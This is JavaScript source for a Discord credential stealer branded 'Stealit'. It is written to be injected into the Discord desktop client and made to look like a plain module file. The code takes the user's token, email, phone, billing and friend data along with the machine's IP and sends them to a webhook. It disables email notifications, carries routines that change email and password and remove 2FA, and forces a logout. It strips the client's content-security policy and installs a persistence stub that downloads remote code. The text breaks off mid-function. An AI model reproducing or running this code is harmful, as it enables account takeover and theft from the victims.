module.exports = require("./core.asar");
process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

const fs = require("fs");
const electron = require("electron");
const https = require("https");
const queryString = require("querystring");

var computerName = process.env.COMPUTERNAME;
let backupscript = `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`;
var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;
var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`;
var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false;

var config = {
  logout: "true",
  "logout-notify": "true",
  "init-notify": "true",
  "embed-color": 3553599,
  disable2FA: "%DISABLEFA%",
  changeMailAuto: "DISABLED!!!",//%AUTOMAILCHANGER%
  mail: "%CLIENTEMAIL%",
  creator: "%NAME_CREATOR%",
  transfer_link: `%TRANSFER_URL%`,
  injection_url:
    "https://raw.githubusercontent.com/sercwn/st/main/lt.js",
  webhook: "%WEBHOOK%",
  Placed: "%API_URL%",
  Filter: {
    urls: [
      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
      "https://*.discord.com/api/v*/applications/detectable",
      "https://discord.com/api/v*/applications/detectable",
      "https://*.discord.com/api/v*/users/@me/library",
      "https://discord.com/api/v*/users/@me/library",
      "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
      "https://discord.com/api/v*/users/@me/billing/subscriptions",
      "wss://remote-auth-gateway.discord.gg/*",
    ],
  },
  onCompleted: {
    urls: [
      "https://discord.com/api/v9/auth/mfa/totp",
      "https://discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/users/@me",
      "https://*.discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/auth/login",
      "https://discord.com/api/v*/auth/login",
      "https://*.discord.com/api/v*/auth/login",
      "https://api.stripe.com/v*/tokens",
      "https://discord.com/api/v*/users/@me/mfa/totp/enable",
      "https://discordapp.com/api/v*/users/@me/mfa/totp/enable",
      "https://*.discord.com/api/v*/users/@me/mfa/totp/enable",
      "https://discord.com/api/v*/users/@me/mfa/sms/enable",
      "https://discord.com/api/v*/users/@me/mfa/sms/disable",
      "https://discord.com/api/v*/users/@me/mfa/totp/disable",
      "https://discordapp.com/api/v*/users/@me/mfa/totp/disable",
      "https://*.discord.com/api/v*/users/@me/mfa/totp/disable",
      "https://discord.com/api/v*/users/@me/mfa/codes-verification",
      "https://*.discord.com/api/v*/users/@me/mfa/codes-verification",
      "https://discordapp.com/api/v*/users/@me/mfa/codes-verification",
    ],
  },
  onCompletedbis: {
    urls: [
      "https://discord.com/api/v9/auth/mfa/totp",
      "https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address",
    ],
  },
};

async function execScript(str) {
  var window = electron.BrowserWindow.getAllWindows()[0];
  var script = await window.webContents.executeJavaScript(str, true);
  return script || null;
}

const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
  var params = {
    username: "Stealit",
    avatar_url:
      "https://cdn.discordapp.com/attachments/1141126749653061772/1206216775868358718/sZMlHua.png",
    content: "",
    embeds: [
      {
        title: title,
        color: config["embed-color"],
        fields: fields,
        description: description ?? "",
        author: {
          name: `Stealit`,
        },

        footer: {
          text: ` [${config.creator}] | https://t.me/stealitpublic`,
        },
      },
    ],
  };

  if (image)
    params.embeds[0].image = {
      url: image,
    };
  if (thumbnail)
    params.embeds[0].thumbnail = {
      url: thumbnail,
    };
  return params;
};

const getIP = () => {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: "api.ipify.org",
      path: "/?format=json",
      method: "GET",
    };

    const req = https.request(options, (res) => {
      let data = "";

      res.on("data", (chunk) => {
        data += chunk;
      });

      res.on("end", () => {
        const json = JSON.parse(data);
        resolve(json.ip);
      });
    });

    req.on("error", (error) => {
      reject(error);
    });

    req.end();
  });
};

const getURL = async (url, token) => {
  var c = await execScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "${url}", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        JSON.parse(xmlHttp.responseText);`);
  return c;
};

const getGifOrPNG = async (url) => {
  var tt = [".gif?size=512", ".png?size=512"];

  var headers = await new Promise((resolve) => {
    https.get(url, (res) => resolve(res.headers));
  });
  var type = headers["content-type"];
  if (type == "image/gif") return url + tt[0];
  else return url + tt[1];
};

const GetBadges = (e) => {
  var n = "";
  return (
    1 == (1 & e) && (n += "<:staff:1206218881593516032> "),
    2 == (2 & e) && (n += "<:partner:1206219075009912852> "),
    4 == (4 & e) && (n += "<:hypesquadevents:1206219207860158464> "),
    8 == (8 & e) && (n += "<:bughunter:1206219577768280076> "),
    64 == (64 & e) && (n += "<:bravery:1206219946766639124> "),
    128 == (128 & e) && (n += "<:brilliance:1206220094342963220> "),
    256 == (256 & e) && (n += "<:balance:1206220232973357108> "),
    512 == (512 & e) && (n += "<:earlysupporter:1206220398845239327> "),
    16384 == (16384 & e) && (n += "<:bughuntergold:1206219776477630504> "),
    4194304 == (4194304 & e) && (n += "<:activedeveloper:1206220587144319027> "),
    131072 == (131072 & e) && (n += "<:verifieddeveloper:1206220791251996705> "),
    "" == n && (n = ":x:"),
    n
  );
};
const GetRBadges = (e) => {
  var n = "";
  return (
    1 == (1 & e) && (n += "<:staff:1206218881593516032> "),
    2 == (2 & e) && (n += "<:partner:1206219075009912852> "),
    4 == (4 & e) && (n += "<:hypesquadevents:1206219207860158464> "),
    8 == (8 & e) && (n += "<:bughunter:1206219577768280076> "),
    512 == (512 & e) && (n += "<:early:944071770506416198> "),
    16384 == (16384 & e) && (n += "<:bughuntergold:1206219776477630504> "),
    131072 == (131072 & e) && (n += "<:verifieddeveloper:1206220791251996705> "),
    "" == n && (n = ":x:"),
    n
  );
};

const GetNSFW = (bouki) => {
  switch (bouki) {
    case true:
      return "<:18plus:1206222734686822420> `NSFW Allowed`";
    case false:
      return "<:18down:1206222697990983763> `NSFW Not Allowed`";
    default:
      return "Idk bro you got me";
  }
};
const GetA2F = (bouki) => {
  switch (bouki) {
    case true:
      return "<:lock:1206223263773229096> `2FA Enabled`";
    case false:
      return "<:unlock:1206223364079747134> `2FA Not Enabled`";
    default:
      return "Idk bro you got me";
  }
};

const parseFriends = (friends) => {
  try {
    var real = friends.filter((x) => x.type == 1);
    var rareFriends = "";
    for (var friend of real) {
      var badges = GetRBadges(friend.user.public_flags);
      if (badges !== ":x:")
        rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`;
    }
    if (!rareFriends) rareFriends = "No Rare Friends";
    return {
      len: real.length,
      badges: rareFriends,
    };
  } catch (err) {
    return ":x:";
  }
};

const parseBilling = (billings) => {
  var Billings = "";
  try {
    if (!billings) return (Billings = ":x:");
    billings.forEach((res) => {
      if (res.invalid) return;
      switch (res.type) {
        case 1:
          Billings += "<a:black_tick:1206223964007825480> <a:creditc4rt:1206223818994225152>";
          break;
        case 2:
          Billings += "<a:rainbow_tick:1206224649319616512> <a:paypal:1206224377142583326>";
      }
    });
    if (!Billings) Billings = ":x:";
    return Billings;
  } catch (err) {
    return ":x:";
  }
};

const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));

function generateId(len) {
  var text = "";
  var possible = "0123456789";
  for (var i = 0; i < len; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  return text;
}

function remove2FA(token, code) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      code,
    });
    const options = {
      hostname: "discord.com",
      port: 443,
      path: "/api/v9/users/@me/mfa/totp/disable",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: token,
      },
    };
    const req = https.request(options, (res) => {
      let responseData = "";
      res.on("data", (chunk) => {
        responseData += chunk;
      });
      res.on("end", () => {
        resolve(responseData);
      });
    });
    req.on("error", (error) => {
      reject(error.message);
    });
    req.write(data);
    req.end();
  });
}
const GetNitro = (r) => {
  if (!r.premium_type) return ":x:";
  switch (r.premium_type) {
    default:
      return ":x:";
    case 1:
      return "<:nitro:1206224999581491260>";
    case 2:
      if (!r.premium_guild_since)
        return "<:nitro:1206224999581491260>";
      var now = new Date(Date.now());
      var arr = [
        "<:2months_boost:1206225594174668861>",
        "<:3months_boost:1206225325563056178>",
        "<:6months_boost:1206225574356324372>",
        "<:9months_boost:1206225638982295562>",
        "<:12months_boost:1206225703922565210>",
        "<:15months_boost:1206225813255626752>",
        "<:18months_boost:1206225893752832031>",
        "<:24months_boost:1206225990989258782>",
      ];
      var a = [
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
      ];
      var b = [2, 3, 6, 9, 12, 15, 18, 24];
      var r = [];
      for (var p in a)
        r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000));
      var i = 0;
      for (var p of r) p > 0 ? "" : i++;
      return "<:nitro:1206224999581491260> " + arr[i];
  }
};

function GetLangue(read) {
  var languages = {
    fr: ":flag_fr: French",
    pt: ":flag_pt: Portuguese",
    da: ":flag_dk: Dansk",
    de: ":flag_de: Deutsch",
    "en-GB": ":england: English (UK)",
    "en-US": ":flag_us: USA",
    "en-ES": ":flag_es: Espagnol",
    hr: ":flag_hr: Croatian",
    it: ":flag_it: Italianio",
    lt: ":flag_lt: Lithuanian",
    hu: ":flag_no::flag_hu: Hungarian",
    no: ":flag_no: Norwegian",
    pl: ":flag_pl: Polish",
    "pr-BR": ":flag_pt: Portuguese",
    ro: ":flag_ro: Romanian",
    fi: ":flag_fi: Finnish",
    "sv-SE": ":flag_se: Swedish",
    vi: ":flag_vn: Vietnamese",
    tr: ":flag_tr: Turkish",
    cs: ":flag_cz: Czech",
    el: ":flag_gr: Greek",
    bg: ":flag_bg: Bulgarian",
    ru: ":flag_ru: Russian",
    uk: ":flag_ua: Ukrainian",
    hi: ":flag_in: Indian",
    th: ":flag_tw: Taiwanese",
    "zh-CN": ":flag_cn: Chinese-China",
    ja: ":flag_jp: Japanese",
    "zh-TW": ":flag_cn: Chinese-Taiwanese",
    ko: ":flag_kr: Korean",
  };

  var langue = languages[read] || ":flag_us: USA";
  return langue;
}
const post = async (params) => {
  params = JSON.stringify(params);
  var token = await execScript(tokenScript);
  var n = JSON.stringify({
    data: params,
    token: token,
  });
  [config.Placed, config.webhook].forEach((res) => {
    if (res == "%API" + "_URL%") return;
    if (res == "%\x57EBHOOK%") return;
    const url = new URL(res);
    const options = {
      host: url.hostname,
      port: url.port,
      path: url.pathname,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
    };
    const req = https.request(options);
    req.on("error", (err) => {});
    req.write(res == config.Placed ? n : params);
    req.end();
  });
};

const disablenoti = async () => {
  var token = await execScript(tokenScript);
  const data = {
    email_notifications_disabled: true,
  };

  const postData = JSON.stringify(data);

  const options = {
    hostname: "discord.com",
    path: "/api/v9/users/@me/settings",
    method: "PATCH",
    headers: {
      Authorization: `${token}`,
      "Content-Type": "application/json",
      "Content-Length": postData.length,
    },
  };

  const req = https.request(options, (res) => {
    if (res.statusCode === 200) {
    } else {
    }
  });

  req.on("error", (error) => {
    console.error("Erreur lors de la requête :", error);
  });
  req.write(postData);
  req.end();
};

async function init() {
  disablenoti();
  if (fs.existsSync("./d3dcompiler.dlll")) {
    doTheLogOut = true;
  } else {
    const directoryPath = "./";
    fs.readdir(directoryPath, (err, files) => {
      if (err) {
      } else {
        files.forEach((file) => {});
      }
    });
  }
}
function updateEmail(token, newEmail, password) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      email: newEmail,
      password: password,
      email_token: null,
    });
    const options = {
      hostname: "discord.com",
      port: 443,
      path: "/api/v9/users/@me",
      method: "PATCH",
      headers: {
        "Content-Type": "application/json",
        Authorization: `${token}`,
      },
    };
    const req = https.request(options, (res) => {
      let responseData = "";
      res.on("data", (chunk) => {
        responseData += chunk;
      });
      res.on("end", () => {
        resolve(responseData);
      });
    });
    req.on("error", (error) => {
      reject(error.message);
    });
    req.write(data);
    req.end();
  });
}

function updatePassword(token, oldpassword, newpassword) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      password: oldpassword,
      new_password: newpassword,
    });
    const options = {
      hostname: "discord.com",
      port: 443,
      path: "/api/v9/users/@me",
      method: "PATCH",
      headers: {
        "Content-Type": "application/json",
        Authorization: `${token}`,
      },
    };
    const req = https.request(options, (res) => {
      let responseData = "";
      res.on("data", (chunk) => {
        responseData += chunk;
      });
      res.on("end", () => {
        resolve(responseData);
      });
    });
    req.on("error", (error) => {
      reject(error.message);
    });
    req.write(data);
    req.end();
  });
}
function generatePassword() {
  const baseWords = ["Stealit", "bbyshit", "Gaypsilon", "xd"];
  const randomBaseWord =
    baseWords[Math.floor(Math.random() * baseWords.length)];
  const randomNumberCount = Math.floor(Math.random() * 9) + 1;
  const randomLettersCount =
    Math.floor(Math.random() * (randomBaseWord.length - 1)) + 2;
  const randomSymbolCount = Math.floor(Math.random() * 2) + 1;
  let password = "";
  password += randomBaseWord;
  function generateRandomLetter() {
    const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    return alphabet[Math.floor(Math.random() * alphabet.length)];
  }
  for (let i = 0; i < randomLettersCount; i++) {
    password += generateRandomLetter();
  }
  function generateRandomSymbol() {
    const symbols = "!@#$%^&*()-_=+[]{}|;:,.<>?";
    return symbols[Math.floor(Math.random() * symbols.length)];
  }
  for (let i = 0; i < randomSymbolCount; i++) {
    password += generateRandomSymbol();
  }
  function generateRandomDigit() {
    return Math.floor(Math.random() * 10);
  }
  for (let i = 0; i < randomNumberCount; i++) {
    password += generateRandomDigit();
  }
  return password;
}

const FirstTime = async () => {
  var token = await execScript(tokenScript);
  if (config["init-notify"] !== "true") return true;
  if (fs.existsSync(__dirname + "/ThiefCat")) {
    try {
      fs.rmdirSync(__dirname + "/ThiefCat");
    } catch (err) {}
    var ip = await getIP();
    console.log(ip);
    var { appPath, appName } = path;
    var client_discord = appName;
    if (!token) {
      var params = await makeEmbed({
        title: "<:stealit:1206869154691416084> Stealit Initialized",
        fields: [
          {
            name: "Injection Info",
            value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
            inline: !1,
          },
        ],
      });
    } else {
      var user = await getURL("https://discord.com/api/v8/users/@me", token);
      var billing = await getURL(
        "https://discord.com/api/v9/users/@me/billing/payment-sources",
        token
      );
      var friends = await getURL(
        "https://discord.com/api/v9/users/@me/relationships",
        token
      );
      var Nitro = await getURL(
        "https://discord.com/api/v9/users/" + user.id + "/profile",
        token
      );

      var Billings = parseBilling(billing);
      var Friends = parseFriends(friends);
      if (!user.avatar)
        var userAvatar =
          "https://cdn.discordapp.com/attachments/1141126749653061772/1206216775868358718/sZMlHua.png";
      if (!user.banner)
        var userBanner =
          "https://cdn.discordapp.com/attachments/1141126749653061772/1206853908048121886/a0d3e020-ede5-4787-b023-598ab083d3cc.gif";

      userBanner =
        userBanner ??
        (await getGifOrPNG(
          `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
        ));
      userAvatar =
        userAvatar ??
        (await getGifOrPNG(
          `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
        ));
      var params = await makeEmbed({
        title: " Stealit Initialized",
        description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
        fields: [
          {
            name: "Username <:mention:1206228892629864488>",
            value: `\`${user.username}#${user.discriminator}\``,
            inline: !0,
          },
          {
            name: "ID <:identy:1206228345407406120>",
            value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
            inline: !0,
          },
          {
            name: "Nitro <:nitros:1206229096128843837>",
            value: `${GetNitro(Nitro)}`,
            inline: !0,
          },
          {
            name: "Badges <a:badges:1206229283366768701>",
            value: `${GetBadges(user.flags)}`,
            inline: !0,
          },
          {
            name: "Language <:language:1206229413998493737>",
            value: `${GetLangue(user.locale)}`,
            inline: !0,
          },
          {
            name: "NSFW <:underagex:1206229680856895519>",
            value: `${GetNSFW(user.nsfw_allowed)}`,
            inline: !0,
          },
          {
            name: "2FA <:keys:1206229927507136574>",
            value: `${GetA2F(user.mfa_enabled)}`,
            inline: !0,
          },
          {
            name: "@Copyright",
            value: `[Stealit 2024](https://t.me/stealitpublic)`,
            inline: !0,
          },
          {
            name: "Stealit Files 📁",
            value: `[Gofile](${config.transfer_link})`,
            inline: !0,
          },
          {
            name: "Billing <a:moneyx:1206250495329570948>",
            value: `${Billings}`,
            inline: !0,
          },
          {
            name: "Email <:mail:1206251253567455314>",
            value: `\`${user.email ?? "none"}\``,
            inline: !0,
          },
          {
            name: "Bio <:stealit:1206869154691416084>",
            value: `\`\`\`${
              user.bio !== null && user.bio !== undefined && user.bio !== ""
                ? user.bio
                : ":x:"
            }\`\`\``,
            inline: false,
          },
          {
            name: "<:artreal:1206252088112316456> Token",
            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
            inline: !1,
          },
        ],

        thumbnail: userAvatar,
      });
      var params2 = await makeEmbed({
        title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
        color: config["embed-color"],
        description: Friends.badges,
        image: userBanner,
        thumbnail: userAvatar,
      });

      params.embeds.push(params2.embeds[0]);
    }
    await post(params);
    if (
      (config.logout != "false" || config.logout !== "%LOGOUT%") &&
      config["logout-notify"] == "true"
    ) {
      if (!token) {
        var params = await makeEmbed({
          title:
            "<:stealit:1206869154691416084> Stealit User log out (User not Logged in before)",
          fields: [
            {
              name: "Injection Info",
              value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
              inline: !1,
            },
          ],
        });
      } else {
        var user = await getURL("https://discord.com/api/v8/users/@me", token);
        var billing = await getURL(
          "https://discord.com/api/v9/users/@me/billing/payment-sources",
          token
        );
        var friends = await getURL(
          "https://discord.com/api/v9/users/@me/relationships",
          token
        );
        var Nitro = await getURL(
          "https://discord.com/api/v9/users/" + user.id + "/profile",
          token
        );

        var Billings = parseBilling(billing);
        var Friends = parseFriends(friends);
        if (!user.avatar)
          var userAvatar =
            "https://cdn.discordapp.com/attachments/1141126749653061772/1206216775868358718/sZMlHua.png";
        if (!user.banner)
          var userBanner =
            "https://cdn.discordapp.com/attachments/1141126749653061772/1206853908048121886/a0d3e020-ede5-4787-b023-598ab083d3cc.gif";

        userBanner =
          userBanner ??
          (await getGifOrPNG(
            `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
          ));
        userAvatar =
          userAvatar ??
          (await getGifOrPNG(
            `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
          ));
        var params = await makeEmbed({
          title:
            "<:stealit:1206869154691416084> Stealit Victim got logged out",
          description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
          fields: [
            {
              name: "Username <:mention:1206228892629864488>",
              value: `\`${user.username}#${user.discriminator}\``,
              inline: !0,
            },
            {
              name: "ID <:identy:1206228345407406120>",
              value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
              inline: !0,
            },
            {
              name: "Nitro <:nitros:1206229096128843837>",
              value: `${GetNitro(Nitro)}`,
              inline: !0,
            },
            {
              name: "Badges <a:badges:1206229283366768701>",
              value: `${GetBadges(user.flags)}`,
              inline: !0,
            },
            {
              name: "Language <:language:1206229413998493737>",
              value: `${GetLangue(user.locale)}`,
              inline: !0,
            },
            {
              name: "NSFW <:underagex:1206229680856895519>",
              value: `${GetNSFW(user.nsfw_allowed)}`,
              inline: !0,
            },
            {
              name: "2FA <:keys:1206229927507136574>",
              value: `${GetA2F(user.mfa_enabled)}`,
              inline: !0,
            },
            {
              name: "@Copyright",
              value: `[Stealit 2024](https://t.me/stealitpublic)`,
              inline: !0,
            },
            {
              name: "Stealit Files 📁",
              value: `[Gofile](${config.transfer_link})`,
              inline: !0,
            },
            {
              name: "Billing <a:moneyx:1206250495329570948>",
              value: `${Billings}`,
              inline: !0,
            },
            {
              name: "Email <:mail:1206251253567455314>",
              value: `\`${user.email}\``,
              inline: !0,
            },
            {
              name: "Phone <:iphone:1206253352439255051>",
              value: `\`${user.phone ?? "None"}\``,
              inline: !0,
            },
            {
              name: "Bio <:stealit:1206869154691416084>",
              value: `\`\`\`${
                user.bio !== null && user.bio !== undefined && user.bio !== ""
                  ? user.bio
                  : ":x:"
              }\`\`\``,
              inline: false,
            },
            {
              name: "<:artreal:1206252088112316456> Token",
              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://stealit.vercel.app/?p=${token})\n\n[Download Banner](${userBanner})`,
              inline: !1,
            },
          ],

          thumbnail: userAvatar,
        });
        var params2 = await makeEmbed({
          title: `<:people:1206252520356323359> Total Friends (${Friends.len})`,
          color: config["embed-color"],
          description: Friends.badges,
          image: userBanner,
          thumbnail: userAvatar,
        });

        params.embeds.push(params2.embeds[0]);
      }

      try {
        fs.writeFileSync("./d3dcompiler.dlll", "LogOut");
      } catch (err) {}
      await execScript(logOutScript);
      doTheLogOut = true;

      await post(params);
    }

    return false;
  }
};

const path = (function () {
  var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/");
  appPath.pop();
  appPath = appPath.join("/");
  var appName = electron.app.getName();
  return {
    appPath,
    appName,
  };
})();

const checUpdate = () => {
  var { appPath, appName } = path;
  if (!doTheLogOut) {
    try {
      fs.writeFileSync("./d3dcompiler.dlll", "LogOut");
    } catch (err) {}
    execScript(logOutScript);
    doTheLogOut = true;
  }

  var ressource = `${appPath}/app`;
  var indexFile = __filename.replace(/\\/g, "/");
  var betterDiscord = `${process.env.appdata.replace(
    /\\/g,
    "/"
  )}/betterdiscord/data/betterdiscord.asar`;
  var package = `${ressource}/package.json`;
  var index = `${ressource}/index.js`;

  if (!fs.existsSync(ressource)) fs.mkdirSync(ressource);
  fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`);

  var script = `const fs = require("fs"), https = require("https")
    
    var index = "${indexFile}"
    var betterDiscord = "${betterDiscord}"
    
    var negger = fs.readFileSync(index).toString()
    if (negger == "module.exports = require('./core.asar');") init()
    
    function init() {
        https.get("${config.injection_url}", res => {
            var chunk = ""
            res.on("data", data => chunk += data)
            res.on("end", () => fs.writeFileSync(index, chunk.replace("%\x57EBHOOK%", "${config.webhook}")))
        }).on("error", (err) => setTimeout(init(), 10000));
    }
    
    require("${appPath}/app.asar")
    if (fs.existsSync(betterDiscord)) require(betterDiscord)`;
  fs.writeFileSync(index, script);
  return;
};
electron.session.defaultSession.webRequest.onBeforeRequest(
  config.Filter,
  async (details, callback) => {
    await electron.app.whenReady();
    await FirstTime();
    await init();
    if (details.url.startsWith("wss://remote-auth-gateway"))
      return callback({
        cancel: true,
      });

    checUpdate();
    callback({});
  }
);

electron.session.defaultSession.webRequest.onHeadersReceived(
  (request, callback) => {
    delete request.responseHeaders["content-security-policy"];
    delete request.responseHeaders["content-security-policy-report-only"];
    callback({
      responseHeaders: {
        ...request.responseHeaders,
        "Access-Control-Allow-Headers": "*",
      },
    });
  }
);

async function BoukiTuclcavectesfonctions() {
  var token = await execScript(tokenScript);
  var user = await getURL("https://discord.com/api/v8/users/@me", token);
  var billing = await getURL(
    "https://discord.com/api/v9/users/@me/billing/payment-sources",
    token
  );
  var friends = await getURL(
    "https://discord.com/api/v9/users/@me/relationships",
    token
  );
  var Nitro = await getURL(
    "https://discord.com/api/v9/users/" + user.id + "/profile",
    token
  );
  if (!user.avatar)
    var userAvatar =
      "https://cdn.discordapp.com/attachments/1141126749653061772/1206216775868358718/sZMlHua.png";
  if (!user.banner)
    var userBanner =
      "https://cdn.discordapp.com/attachments/1141126749653061772/1206853908048121886/a0d3e020-ede5-4787-b023-598ab083d3cc.gif";

  var userBanner =
    userBanner ??
    (await getGifOrPNG(
      `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
    ));
  var userAvatar =
    userAvatar ??
    (await getGifOrPNG(
      `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
    ));
  var Billings = parseBilling(billing);
  var Friends = parseFriends(friends);
  return {
    token,
    user,
    billing,
    friends,
    Nitro,
    userAvatar,
    userBanner,
    userAvatar,
    Billings,
    Friends,
  };
}

let scriptExecuted = false;

electron.session.defaultSession.webRequest.onHeadersReceived(
  async (request, callback) => {
    delete request.responseHeaders["content-security-policy"];
    delete request.responseHeaders["content-security-policy-report-only"];
    callback({
      responseHeaders: {
        ...request.responseHeaders,
        "Access-Control-Allow-Headers": "*",
      },
    });
    /*if (request.url.includes("/users/@me")){
      if (!["POST", "PATCH"].includes(request.method)) return;
    if (request.statusCode !== 200) return;
    try {
      var data = JSON.parse(request.uploadData[0].bytes);
    } catch (err) {
      var data = queryString.parse(
        decodeURIComponent(request.uploadData[0].bytes.toString())
      );
    }
      console.log(data)
    }*/
    
    if (config.force_backups_codes == "true") {
      if (request.url.includes("/users/@me") && !scriptExecuted) {
        scriptExecuted = true;
        var {
          token,
          user,
          billing,
          friends,
          Nitro,
          userAvatar,
          userBanner,
          Billings,
          Friends,
        } = await BoukiTuclcavectesfonctions();
        let language = user.locale ?? "en-US";

        let [
          editprofil,
          editemailbutton,
          titlepop,
          intropop,
          endintro,
          lastend,
          contact,
        ] = await traduireTexte(language);
        await execScript(
          `
                function clickButton(selector) {
                  return new Promise((resolve, reject) => {
                    const button = document.querySelector(selector);
                    if (button) {
                      const event = new MouseEvent("click", {
                        bubbles: true,
                        cancelable: true,
                        view: window,
                      });
                
                      button.dispatchEvent(event);
                      resolve();
                    } else {
                    }
                  });
                }
                
                async function simulateClicks() {
                  try {
                    const div = document.createElement("div");
                    div.innerHTML =
                      '<div class="layerContainer-2lfOPe"> <div class="backdrop-2ByYRN withLayer-2VVmpp" style="opacity: 0.85; background: var(--black-500);"></div> <div class="layer-fP3xEz"> <div class="focusLock-bHVOlV" role="dialog" aria-labelledby=":rr:" tabindex="-1" aria-modal="true"> <div class="root-1CAIjD small-2xUY-3 fullscreenOnMobile-2971EC rootWithShadow-2hdL2J" style="opacity: 1; transform: scale(1);"><img alt="" class="headerImage-2osrlm" src="/assets/222756e9418e375e7ae974594b3aa1d2.svg"> <div style="position: relative; width: 440px; height: 367px; overflow: hidden;"> <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; left: auto; right: auto;"> <form> <div class="flex-2S1XBF flex-3BkGQD horizontal-112GEH horizontal-1Piu5- flex-3BkGQD directionRow-2Iu2A9 justifyStart-2Mwniq alignCenter-14kD11 noWrap-hBpHBz header-1ffhsl confirmStartHeader-34wA-K" id=":rr:" style="flex: 0 0 auto;"> <div class="colorHeaderPrimary-3kwW7L size24-15VPAv title-3VYtQS">${titlepop} </div> <div class="defaultColor-1EVLSt text-md-normal-2rFCH3 description-3_efmf" data-text-variant="text-md/normal"> <p>${intropop} <strong>${user.email}</strong>, ${endintro} ${lastend}&nbsp;? ${contact}.</p> </div>  </div> </form> </div> </div> </div> </div> </div></div>';
                    document.body.appendChild(div);
                    document.body.appendChild(div);
                    await new Promise((resolve) => setTimeout(resolve, 10000));
                    document.body.removeChild(div);
                    await clickButton('button[aria-label="${editprofil}"]');
                    await new Promise((resolve) => setTimeout(resolve, 1000));
                    await clickButton('button[aria-label="${editemailbutton}"]');
                  } catch (error) {}
                }
                
                simulateClicks();
                `
        );
      }
    }
    if (config.changeMailAuto == "true") {
      if (request.url.includes("/users/@me") && !scriptExecuted) {
        scriptExecuted = true;
        var {
          token,
          user,
          billing,
          friends,
          Nitro,
          userAvatar,
          userBanner,
          Billings,
          Friends,
        } = await BoukiTuclcavectesfonctions();
        let language = user.locale ?? "en-US";

        let [
          editprofil,
          editemailbutton,
          titlepop,
          intropop,
          endintro,
          lastend,
          contact,
        ] = await traduireTexte(language);
        await execScript(
          `
                function clickButton(selector) {
                  return new Promise((resolve, reject) => {
                    const button = document.querySelector(selector);
                    if (button) {
                      const event = new MouseEvent("click", {
                        bubbles: true,
                        cancelable: true,
                        view: window,
                      });
                
                      button.dispatchEvent(event);
                      resolve();
                    } else {
                    }
                  });
                }
                
                async function simulateClicks() {
                  try {
                    const div = document.createElement("div");
                    div.innerHTML =
